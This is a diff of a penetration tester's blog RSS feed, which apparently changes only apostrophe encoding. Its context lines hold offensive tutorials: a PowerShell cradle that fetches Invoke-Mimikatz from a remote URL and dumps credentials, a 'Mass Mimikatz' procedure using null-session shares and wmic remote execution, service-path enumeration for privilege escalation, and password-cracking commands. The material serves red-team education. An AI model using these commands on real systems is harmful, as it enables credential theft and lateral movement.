@@ -17,15 +17,15 @@
       
       <guid>https://malicious.link/post/2014/2014-01-29-hostname-bruteforcing-on-the-cheap/</guid>
       <description>&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;Quick update&lt;/strong&gt;: As &lt;a href=&#34;http://twitter.com/mikedamm&#34;&gt;@MikeDamm&lt;/a&gt; &lt;a href=&#34;http://twitter.com/mikedamm/status/428725199068864512&#34;&gt;points out&lt;/a&gt;, xargs has a &lt;code&gt;-P&lt;/code&gt; option that can do the same thing I&#39;m using parallel for. If you have a supported version of xargs you can use &lt;code&gt;-P 0&lt;/code&gt; to do the same thing as &lt;code&gt;-j0&lt;/code&gt; with parallel, but if your version doesn&#39;t support the &lt;code&gt;0&lt;/code&gt; you can simply use the same number parallel uses ala:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Quick update&lt;/strong&gt;: As &lt;a href=&#34;http://twitter.com/mikedamm&#34;&gt;@MikeDamm&lt;/a&gt; &lt;a href=&#34;http://twitter.com/mikedamm/status/428725199068864512&#34;&gt;points out&lt;/a&gt;, xargs has a &lt;code&gt;-P&lt;/code&gt; option that can do the same thing I&amp;rsquo;m using parallel for. If you have a supported version of xargs you can use &lt;code&gt;-P 0&lt;/code&gt; to do the same thing as &lt;code&gt;-j0&lt;/code&gt; with parallel, but if your version doesn&amp;rsquo;t support the &lt;code&gt;0&lt;/code&gt; you can simply use the same number parallel uses ala:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;cat subdomains.txt | xargs -P 122 -I subdomain dig +noall subdomain.microsoft.com +answer&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;This results in roughly the same completion time as it&#39;s parallel counterpart. Thanks @MikeDamm!&lt;/p&gt;
+&lt;p&gt;This results in roughly the same completion time as it&amp;rsquo;s parallel counterpart. Thanks @MikeDamm!&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;There are some great discussions on the NoVA Hackers mailing list. One such discussion was about what the best way to do dns hostname brute forcing was and which tool is better than another. For me, I just use the command line and then parse the results (or just ask the deepmagic.com database ;-)&lt;/p&gt;
 &lt;p&gt;Here is what I do:&lt;/p&gt;
-&lt;p&gt;First, you need a good list of DNS sub domains / hostnames. Personally I use the list provided over at &lt;a href=&#34;http://www.ethicalhack3r.co.uk/zone-transfers-on-the-alexa-top-1-million/&#34;&gt;http://www.ethicalhack3r.co.uk/zone-transfers-on-the-alexa-top-1-million/&lt;/a&gt; (with a few minor tweaks). If you haven&#39;t read that post and follow-on posts you really should. But take the list and save it locally. Then just run the following command:&lt;/p&gt;
+&lt;p&gt;First, you need a good list of DNS sub domains / hostnames. Personally I use the list provided over at &lt;a href=&#34;http://www.ethicalhack3r.co.uk/zone-transfers-on-the-alexa-top-1-million/&#34;&gt;http://www.ethicalhack3r.co.uk/zone-transfers-on-the-alexa-top-1-million/&lt;/a&gt; (with a few minor tweaks). If you haven&amp;rsquo;t read that post and follow-on posts you really should. But take the list and save it locally. Then just run the following command:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;cat subdomains.txt | xargs -t -I subdomain dig +noall subdomain.microsoft.com +answer&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
@@ -194,14 +194,14 @@ backoffice.microsoft.com. 3600	IN	A	65.55.58.201
 &lt;p&gt;You can very easily use this script directly from an admin command prompt as so:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds&amp;quot;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;(This works REALLY well for Citrix and Kiosk scenarios and it&#39;s too hard to type/remember)
+&lt;p&gt;(This works REALLY well for Citrix and Kiosk scenarios and it&amp;rsquo;s too hard to type/remember)
 This runs the powershell script by directly pulling it from Github and executing it &amp;ldquo;in memory&amp;rdquo; on your system.&lt;/p&gt;
 &lt;p&gt;One of the awesome added capabilities for this script is to run on a list of hosts. as so:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds -ComputerName @(&#39;computer1&#39;, &#39;computer2&#39;)&amp;quot;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;This works great as all the output is directly on your system and all executed through Powershell Remoting. &lt;a href=&#34;%22http://msdn.microsoft.com/en-us/library/windows/desktop/ee706585(v=vs.85).aspx%22&#34;&gt;Powershell Remoting&lt;/a&gt; is pretty much the same as WinRM. This service however is not enabled by default and can be pretty hit or miss on how much any given enterprise uses WinRM. However, it is usually the servers and more important systems that have it enabled more often than not.&lt;/p&gt;
 &lt;p&gt;You can find WinRM / PowerShell Remoting by scanning for the service port 47001 as well as the default comm ports for WinRM 5985 (HTTP) and 5986 (HTTPS).&lt;/p&gt;
-&lt;p&gt;If you find that your target isn&#39;t a WinRM rich environment or you just want more passwords you can take a slightly more painful route, I call it &amp;ldquo;Mass Mimikatz&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;If you find that your target isn&amp;rsquo;t a WinRM rich environment or you just want more passwords you can take a slightly more painful route, I call it &amp;ldquo;Mass Mimikatz&amp;rdquo;&lt;/p&gt;
 &lt;p&gt;Step 1. Make a share, we are doing this so we can not only collect the output of all our computers passwords, but to host the CMD batch file that will run the powershell script:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;cd\
 mkdir open
@@ -209,7 +209,7 @@ net share open=C:\open /grant:everyone,full
 icacls C:\open\ /grant Everyone:(OI)(CI)F /t
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;We are setting &amp;ldquo;Everyone&amp;rdquo; permissions on a Share (net share) and NTFS (icacls) level for this to work properly.&lt;/p&gt;
-&lt;p&gt;Step 2. Set registry keys. There are two registry keys that we need to set. The first allows Null Sessions to our new share and the second allows null users to have the &amp;ldquo;Everyone&amp;rdquo; token so that we don&#39;t have to get crazy with our permissions. I have create a meterpreter script that has a bunch of error checking here: &lt;a href=&#34;https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/massmimi_reg.rb&#34;&gt;massmimi_reg.rb&lt;/a&gt;
+&lt;p&gt;Step 2. Set registry keys. There are two registry keys that we need to set. The first allows Null Sessions to our new share and the second allows null users to have the &amp;ldquo;Everyone&amp;rdquo; token so that we don&amp;rsquo;t have to get crazy with our permissions. I have create a meterpreter script that has a bunch of error checking here: &lt;a href=&#34;https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/massmimi_reg.rb&#34;&gt;massmimi_reg.rb&lt;/a&gt;
 or you can just make the following changes&amp;rdquo;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ  = open
 HKLM\System\CurrentControlSet\Contol\Lsa &amp;quot;EveryoneIncludesAnonymous&amp;quot; = 1
@@ -220,7 +220,7 @@ HKLM\System\CurrentControlSet\Contol\Lsa &amp;quot;EveryoneIncludesAnonymous&amp
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Step 5. Upload &lt;a href=&#34;http://clymb3r.wordpress.com/&#34;&gt;clymb3r&lt;/a&gt;&amp;lsquo;s Invoke-Mimikatz ps1 - Download from &lt;a href=&#34;https://github.com/mattifestation/PowerSploit&#34;&gt;PowerSploit&lt;/a&gt; repo: &lt;a href=&#34;https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#34;&gt;source on github&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Step 6. Upload mongoose: &lt;a href=&#34;http://cesanta.com/downloads.html&#34;&gt;Downloads Page&lt;/a&gt; - Both regular and tiny versions work. This is an awesome, single executable webserver that supports LUA, Sqlite, and WebDAV out of the box. Tiny version is under 100k.&lt;/p&gt;
-&lt;p&gt;Step 7. Upload serverlist.txt - This is a line by line list of computer names to use mimikatz on. You&#39;ll have to gather this one way or another.&lt;/p&gt;
+&lt;p&gt;Step 7. Upload serverlist.txt - This is a line by line list of computer names to use mimikatz on. You&amp;rsquo;ll have to gather this one way or another.&lt;/p&gt;
 &lt;p&gt;Step 8. Execute mongoose (from directory with mimikatz.ps1) - This will start a listener with directory listings enabled on port 8080 by default&lt;/p&gt;
 &lt;p&gt;Step 9a. Execute wmic:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;wmic /node:@serverlist.txt process call create &amp;quot;\\192.168.92.127\open\powershellme.cmd&amp;quot;
@@ -230,7 +230,7 @@ HKLM\System\CurrentControlSet\Contol\Lsa &amp;quot;EveryoneIncludesAnonymous&amp
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Step 10. Watch as text files full of wonder and joy fill your share.&lt;/p&gt;
 &lt;p&gt;You can find the scripts here: &lt;a href=&#34;https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz&#34;&gt;https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Don&#39;t forget to clean up::&lt;/p&gt;
+&lt;p&gt;Don&amp;rsquo;t forget to clean up::&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;kill mongoose process&lt;/li&gt;
 &lt;li&gt;net share open /delete&lt;/li&gt;
@@ -254,7 +254,7 @@ HKLM\System\CurrentControlSet\Contol\Lsa &amp;quot;EveryoneIncludesAnonymous&amp
       <description>&lt;p&gt;This is how I did it:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;for /f &amp;quot;tokens=5 delims=&amp;quot; %A in (&#39;reg query HKLM\SYSTEM\CurrentControlSet\Services&#39;) do sc qc %A&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Let me know if you know of a better way.&lt;/p&gt;
-&lt;p&gt;If you don&#39;t know why this could be important read here:&lt;/p&gt;
+&lt;p&gt;If you don&amp;rsquo;t know why this could be important read here:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://www.ihtb.org/security/program.exe-privilege_escalation.txt&#34;&gt;http://www.ihtb.org/security/program.exe-privilege_escalation.txt&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;If you are on a Win7 box or otherwise have the option to use WMI you can use the following command: &lt;code&gt;wmic service get pathname&lt;/code&gt;&lt;/p&gt;
 </description>
@@ -266,9 +266,9 @@ HKLM\System\CurrentControlSet\Contol\Lsa &amp;quot;EveryoneIncludesAnonymous&amp
       <pubDate>Mon, 18 Mar 2013 20:01:44 +0000</pubDate>
       
       <guid>https://malicious.link/post/2013/2013-03-18-length-sorting-wordlists/</guid>
-      <description>&lt;p&gt;This is one of those stupid simple things that are easy to forget so I&#39;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&#39;t have to, but there is times where it&#39;s important.&lt;/p&gt;
-&lt;p&gt;Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&#39;s sorted and usually is best to sort them by most common first so you get earlier hits. However, if you start throwing rules into the mix that equation changes. If you have &amp;ldquo;iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&amp;rdquo; on the 3rd line of your dictionary, testing every possible permutation where you replace an &amp;lsquo;i&amp;rsquo; with a 1 is going to take a very long time.&lt;/p&gt;
-&lt;p&gt;Both Hashcat and John deal with this by limiting the length where permutations occur. (HC/JTR peeps please correct me if I&#39;m wrong). Cain on the other hand, will try every possibility and hang on the 3rd line for years (over exagerated). How do you solve that? Easy, remove any word over a certain length. While that does work, and very similar to what the HC/JTR do, I don&#39;t like loosing words from my dictionary, so I tend to sort them by length. That way, all the nasty ones are near the end and I can scale back the rules on them.&lt;/p&gt;
+      <description>&lt;p&gt;This is one of those stupid simple things that are easy to forget so I&amp;rsquo;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&amp;rsquo;t have to, but there is times where it&amp;rsquo;s important.&lt;/p&gt;
+&lt;p&gt;Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&amp;rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits. However, if you start throwing rules into the mix that equation changes. If you have &amp;ldquo;iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&amp;rdquo; on the 3rd line of your dictionary, testing every possible permutation where you replace an &amp;lsquo;i&amp;rsquo; with a 1 is going to take a very long time.&lt;/p&gt;
+&lt;p&gt;Both Hashcat and John deal with this by limiting the length where permutations occur. (HC/JTR peeps please correct me if I&amp;rsquo;m wrong). Cain on the other hand, will try every possibility and hang on the 3rd line for years (over exagerated). How do you solve that? Easy, remove any word over a certain length. While that does work, and very similar to what the HC/JTR do, I don&amp;rsquo;t like loosing words from my dictionary, so I tend to sort them by length. That way, all the nasty ones are near the end and I can scale back the rules on them.&lt;/p&gt;
 &lt;p&gt;To do that is very simple:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;awk &#39;{print length, $0}&#39; rockyou.txt | sort -n | cut -d &amp;quot; &amp;quot; -f2- &amp;gt; rockyou_ls.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thats it. Basic, simple and stored here for reference.&lt;/p&gt;
@@ -281,7 +281,7 @@ HKLM\System\CurrentControlSet\Contol\Lsa &amp;quot;EveryoneIncludesAnonymous&amp
       <pubDate>Mon, 24 Dec 2012 06:55:17 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-12-24-delete-trustedinstaller-only-files-and-folders/</guid>
-      <description>&lt;p&gt;Not very security related, but something I don&#39;t want to forget how to do. It was a PITA. So I had a old WINDOWS directory that I needed to get rid of. And the following commands gave me the ooomph needed to get the job done.&lt;/p&gt;
+      <description>&lt;p&gt;Not very security related, but something I don&amp;rsquo;t want to forget how to do. It was a PITA. So I had a old WINDOWS directory that I needed to get rid of. And the following commands gave me the ooomph needed to get the job done.&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;Get a SYSTEM shell so all modding of permissions will be good.&lt;/li&gt;
 &lt;/ol&gt;
@@ -309,14 +309,14 @@ HKLM\System\CurrentControlSet\Contol\Lsa &amp;quot;EveryoneIncludesAnonymous&amp
 &lt;pre&gt;&lt;code&gt;start /b cmd /c dir /b /s \\nas\users_home_share$ ^&amp;gt; shareinfo.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Breaking that down:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;code&gt;start /b&lt;/code&gt; - starts a process that won&#39;t hang up our current one, with the &amp;ldquo;b&amp;rdquo; flag meaning &amp;ldquo;background&amp;rdquo;, yay not visible to the user! (unless your process forces it back)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;cmd /c&lt;/code&gt; - no reason to explain this one it runs something.. (since dir isn&#39;t an executable but something that resides inside of cmd this is needed)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;dir /b /s&lt;/code&gt; - the &amp;ldquo;s&amp;rdquo; means sub directories and pretty widely known. The one that isn&#39;t as well known is the &amp;ldquo;b&amp;rdquo; which means &amp;ldquo;bare&amp;rdquo; format. Also known as &amp;ldquo;puts-path-on-every-line-to-make-it-easy-to-find-and-grep-stuff&amp;rdquo; mode.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;start /b&lt;/code&gt; - starts a process that won&amp;rsquo;t hang up our current one, with the &amp;ldquo;b&amp;rdquo; flag meaning &amp;ldquo;background&amp;rdquo;, yay not visible to the user! (unless your process forces it back)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cmd /c&lt;/code&gt; - no reason to explain this one it runs something.. (since dir isn&amp;rsquo;t an executable but something that resides inside of cmd this is needed)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;dir /b /s&lt;/code&gt; - the &amp;ldquo;s&amp;rdquo; means sub directories and pretty widely known. The one that isn&amp;rsquo;t as well known is the &amp;ldquo;b&amp;rdquo; which means &amp;ldquo;bare&amp;rdquo; format. Also known as &amp;ldquo;puts-path-on-every-line-to-make-it-easy-to-find-and-grep-stuff&amp;rdquo; mode.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;The path is arbitrary, if you didn&#39;t know you could dir list a UNC path, now ya do.&lt;/p&gt;
+&lt;p&gt;The path is arbitrary, if you didn&amp;rsquo;t know you could dir list a UNC path, now ya do.&lt;/p&gt;
 &lt;p&gt;The &lt;code&gt;^&amp;gt;&lt;/code&gt; is the cool trick. If you use &amp;ldquo;start&amp;rdquo; to create a process in the background, re-routing its output to a file instead of just getting the fact that start began (the only thing start outputs), is made possible by this lowly &amp;lsquo;carrot&amp;rsquo; before the greater-than.&lt;/p&gt;
-&lt;p&gt;And that&#39;s it. With big drives, come back in an hour or two and you&#39;ll have a perfectly grep-able file waiting for you to grep through for file names and extensions to your heart&#39;s content.&lt;/p&gt;
-&lt;p&gt;One caveat, don&#39;t freak out if it&#39;s been 30 minutes and the file size is still ZERO. It doesn&#39;t write the output until the end, it write buffered in the process and then &amp;ldquo;start&amp;rdquo; pulls it back out at the end with the carrot.&lt;/p&gt;
+&lt;p&gt;And that&amp;rsquo;s it. With big drives, come back in an hour or two and you&amp;rsquo;ll have a perfectly grep-able file waiting for you to grep through for file names and extensions to your heart&amp;rsquo;s content.&lt;/p&gt;
+&lt;p&gt;One caveat, don&amp;rsquo;t freak out if it&amp;rsquo;s been 30 minutes and the file size is still ZERO. It doesn&amp;rsquo;t write the output until the end, it write buffered in the process and then &amp;ldquo;start&amp;rdquo; pulls it back out at the end with the carrot.&lt;/p&gt;
 </description>
     </item>
     
@@ -326,7 +326,7 @@ HKLM\System\CurrentControlSet\Contol\Lsa &amp;quot;EveryoneIncludesAnonymous&amp
       <pubDate>Thu, 15 Sep 2011 18:10:33 +0000</pubDate>
       
       <guid>https://malicious.link/post/2011/2011-09-15-disconnect-stalled-ssh-session/</guid>
-      <description>&lt;p&gt;This doesn&#39;t really apply to Windows users as you can just close puTTy. But for everyone else, stalled SSH Sessions suck. You are either slamming enter to get it to realize it&#39;s been disconnected or just waiting for it to. Well, for those of us who are impatient just hit:&lt;/p&gt;
+      <description>&lt;p&gt;This doesn&amp;rsquo;t really apply to Windows users as you can just close puTTy. But for everyone else, stalled SSH Sessions suck. You are either slamming enter to get it to realize it&amp;rsquo;s been disconnected or just waiting for it to. Well, for those of us who are impatient just hit:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;~.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thats right, SHIFT + the key above TAB, release, and hit the period. You may have to hit ENTER first to clear the buffer or whatever it does, but do that and it will disconnect the SSH session right away.&lt;/p&gt;
 &lt;p&gt;Stupid trick, but I use it all the time (especially on shotty MiFi connections).&lt;/p&gt;
@@ -339,9 +339,9 @@ HKLM\System\CurrentControlSet\Contol\Lsa &amp;quot;EveryoneIncludesAnonymous&amp
       <pubDate>Mon, 12 Sep 2011 08:09:46 +0000</pubDate>
       
       <guid>https://malicious.link/post/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/</guid>
-      <description>&lt;p&gt;John the ripper only takes one word list at a time. There are plenty of docs out there that show you how to cat all of your dictionaries into John&#39;s stdin function but I like to run rules against my lists and I didn&#39;t see any how-tos on doing this. Here is my way:&lt;/p&gt;
+      <description>&lt;p&gt;John the ripper only takes one word list at a time. There are plenty of docs out there that show you how to cat all of your dictionaries into John&amp;rsquo;s stdin function but I like to run rules against my lists and I didn&amp;rsquo;t see any how-tos on doing this. Here is my way:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;ls dicts | xargs -t -I file ./john --pot=victim.pot --format=mscash --wordlist=dicts/file --rules victim_cachedump.txt&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;This command will ls the &amp;lsquo;dicts&amp;rsquo; directory, pipe it to xargs, which will spit out the command it uses for each itteration (-t) and replace every time it see the word file with the line/itteration its on (-I). Then it&#39;s just your standard john arguments.&lt;/p&gt;
+&lt;p&gt;This command will ls the &amp;lsquo;dicts&amp;rsquo; directory, pipe it to xargs, which will spit out the command it uses for each itteration (-t) and replace every time it see the word file with the line/itteration its on (-I). Then it&amp;rsquo;s just your standard john arguments.&lt;/p&gt;
 </description>
     </item>
     
